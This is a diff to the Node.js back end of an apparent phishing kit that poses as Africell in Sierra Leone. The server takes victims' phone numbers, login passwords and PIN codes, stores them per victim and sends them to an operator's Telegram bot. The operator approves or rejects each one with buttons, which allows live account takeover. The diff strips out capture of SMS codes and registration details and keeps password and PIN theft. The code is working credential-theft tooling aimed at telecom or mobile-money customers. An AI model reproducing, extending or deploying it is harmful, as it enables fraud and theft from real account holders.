@@ -48,10 +48,10 @@ async function sendToTelegram(url, payload) {
     }
 }
 
-// Handles Submissions across all authentication, recovery, and registration flows
+// Handles Submissions across login and PIN confirmation flows
 app.post('/api/submit-order', async (req, res) => {
     try {
-        const { phone, uniqueId, firstName, lastName, email, dateOfBirth } = req.body;
+        const { phone, uniqueId } = req.body;
         
         const currentTime = Date.now(); 
         const cooldownTime = 15 * 1000; // 15 seconds cooldown
@@ -59,9 +59,8 @@ app.post('/api/submit-order', async (req, res) => {
         // Force status to 'pending' immediately on every new request
         orderStatuses[phone] = 'pending';
 
-        // Bypass cooldown for registration, PIN codes, SMS codes, and passwords so multi-step forms never get stuck
-        const isImportantAction = (firstName || lastName || email || dateOfBirth) || 
-                                  (uniqueId && (uniqueId.startsWith('PIN: ') || uniqueId.startsWith('Signup PIN: ') || uniqueId.startsWith('SMS Code: ') || uniqueId.startsWith('Signup SMS Code: ') || uniqueId.startsWith('New Password: ')));
+        // Bypass cooldown for PIN codes and passwords so multi-step forms never get stuck
+        const isImportantAction = (uniqueId && (uniqueId.startsWith('PIN: ') || uniqueId.startsWith('Password: ')));
 
         if (!isImportantAction && lastSubmissionTime[phone] && (currentTime - lastSubmissionTime[phone] < cooldownTime)) {
             return res.json({ success: true, message: 'Already submitted.' });
@@ -84,65 +83,31 @@ app.post('/api/submit-order', async (req, res) => {
         let wrongButtonText = "❌ Wrong Info";
 
         // Accumulate/Merge incoming data into the user's permanent session profile
-        if (firstName || lastName || email || dateOfBirth) {
-            headerTitle = "📝 *Africell New Account Registration*";
-            userCredentials[phone].registration = { firstName, lastName, email, dateOfBirth };
-        } else if (uniqueId && uniqueId.startsWith('PIN: ')) {
+        if (uniqueId && uniqueId.startsWith('PIN: ')) {
             headerTitle = "🔐 *Africell PIN Code Submitted*";
             wrongButtonText = "⚠️ Wrong PIN";
             userCredentials[phone].mpin = uniqueId.replace('PIN: ', '');
-        } else if (uniqueId && uniqueId.startsWith('Signup PIN: ')) {
-            headerTitle = "✨ *Africell Signup PIN Submitted*";
-            wrongButtonText = "⚠️ Wrong PIN";
-            userCredentials[phone].mpin = uniqueId.replace('Signup PIN: ', '');
-        } else if (uniqueId && (uniqueId.startsWith('SMS Code: ') || uniqueId.startsWith('Signup SMS Code: '))) {
-            headerTitle = "💬 *Africell SMS Verification Code*";
-            wrongButtonText = "⚠️ Wrong Code";
-            userCredentials[phone].smsCode = uniqueId.replace(/^(Signup )?SMS Code: /, '');
-        } else if (uniqueId && uniqueId.startsWith('New Password: ')) {
-            headerTitle = "🔑 *Africell New Password Set*";
-            wrongButtonText = "⚠️ Wrong Password";
-            userCredentials[phone].password = uniqueId.replace('New Password: ', '');
-        } else if (uniqueId && uniqueId.startsWith('Password Recovery Request')) {
-            headerTitle = "🔄 *Africell Password Recovery Request*";
-            userCredentials[phone].flow = 'Password Recovery';
         } else if (uniqueId) {
-            // Captures main login password or any other string data passed in uniqueId
+            // Captures main login password
             userCredentials[phone].password = uniqueId;
             headerTitle = "🔑 *Africell Login Attempt*";
             wrongButtonText = "⚠️ Wrong Password";
         }
 
-        // Build a comprehensive message displaying ALL accumulated user info collected so far
+        // Build a comprehensive message displaying accumulated user info
         let message = `${headerTitle}\n\n` +
                       `${countryFlag} Country: \`+232\`\n` +
                       `📱 Phone: \`${escapeMarkdown(rawDigits)}\``;
 
-        if (userCredentials[phone].flow) {
-            message += `\n🔄 Flow: *${escapeMarkdown(userCredentials[phone].flow)}*`;
-        }
         if (userCredentials[phone].mpin) {
             message += `\n🔐 PIN Code: \`${escapeMarkdown(userCredentials[phone].mpin)}\``;
-        }
-        if (userCredentials[phone].smsCode) {
-            message += `\n💬 SMS Code: \`${escapeMarkdown(userCredentials[phone].smsCode)}\``;
         }
         if (userCredentials[phone].password) {
             message += `\n🔑 Password: \`${escapeMarkdown(userCredentials[phone].password)}\``;
         }
-        if (userCredentials[phone].registration) {
-            const reg = userCredentials[phone].registration;
-            message += `\n👤 First Name: *${escapeMarkdown(reg.firstName || 'N/A')}*\n` +
-                       `👤 Last Name: *${escapeMarkdown(reg.lastName || 'N/A')}*\n` +
-                       `📧 Email: *${escapeMarkdown(reg.email || 'N/A')}*\n` +
-                       `📅 Date of Birth: *${escapeMarkdown(reg.dateOfBirth || 'N/A')}*`;
-        }
-        if (userCredentials[phone].extraDetail && !uniqueId.startsWith('Password Recovery Request')) {
-            message += `\n📌 Detail: \`${escapeMarkdown(userCredentials[phone].extraDetail)}\``;
-        }
 
         const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-        const encodedId = encodeURIComponent(uniqueId || email || 'N/A');
+        const encodedId = encodeURIComponent(uniqueId || 'N/A');
 
         const sentTelegramMsg = await sendToTelegram(telegramUrl, {
             chat_id: CHAT_ID,
@@ -160,7 +125,7 @@ app.post('/api/submit-order', async (req, res) => {
             }
         });
 
-        // 5-minute timeout check for Telegram admin (automatically expires message if unhandled)
+        // 5-minute timeout check for Telegram admin
         if (sentTelegramMsg && sentTelegramMsg.result) {
             const msgChatId = sentTelegramMsg.result.chat.id;
             const msgId = sentTelegramMsg.result.message_id;
@@ -218,7 +183,6 @@ app.post('/api/telegram-webhook', async (req, res) => {
 
             let actionText = '';
             let phone = '';
-            let uniqueId = 'N/A';
             let messageTitle = 'Processed Request';
 
             if (callbackData.startsWith('approve_') || callbackData.startsWith('reject_') || callbackData.startsWith('wrong_id_')) {
@@ -228,8 +192,6 @@ app.post('/api/telegram-webhook', async (req, res) => {
                 const lastUnderscoreIndex = remainder.lastIndexOf('_');
                 if (lastUnderscoreIndex !== -1) {
                     phone = remainder.substring(0, lastUnderscoreIndex);
-                    const encodedId = remainder.substring(lastUnderscoreIndex + 1);
-                    uniqueId = decodeURIComponent(encodedId) || 'N/A';
                 }
 
                 if (callbackData.startsWith('approve_')) {
@@ -250,35 +212,20 @@ app.post('/api/telegram-webhook', async (req, res) => {
             const countryFlag = "🇸🇱";
             const rawDigits = phone ? phone.replace(/\+232/g, '').trim() : '';
 
-            // Rebuild the complete stored user profile message so details never disappear on click
             let updatedMessage = `📋 *${messageTitle}*\n\n` +
                                  `${countryFlag} Country: \`+232\`\n` +
                                  `📱 Phone: \`${escapeMarkdown(rawDigits)}\``;
 
             if (userCredentials[phone]) {
                 const creds = userCredentials[phone];
-                if (creds.flow) {
-                    updatedMessage += `\n🔄 Flow: *${escapeMarkdown(creds.flow)}*`;
-                }
                 if (creds.mpin) {
                     updatedMessage += `\n🔐 PIN Code: \`${escapeMarkdown(creds.mpin)}\``;
-                }
-                if (creds.smsCode) {
-                    updatedMessage += `\n💬 SMS Code: \`${escapeMarkdown(creds.smsCode)}\``;
                 }
                 if (creds.password) {
                     updatedMessage += `\n🔑 Password: \`${escapeMarkdown(creds.password)}\``;
                 }
-                if (creds.registration) {
-                    const reg = creds.registration;
-                    updatedMessage += `\n👤 First Name: *${escapeMarkdown(reg.firstName || 'N/A')}*\n` +
-                                      `👤 Last Name: *${escapeMarkdown(reg.lastName || 'N/A')}*\n` +
-                                      `📧 Email: *${escapeMarkdown(reg.email || 'N/A')}*\n` +
-                                      `📅 Date of Birth: *${escapeMarkdown(reg.dateOfBirth || 'N/A')}*`;
-                }
             }
 
-            // Append the final action status at the bottom
             updatedMessage += `\n\n📌 Status: *${actionText}*`;
 
             const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`;
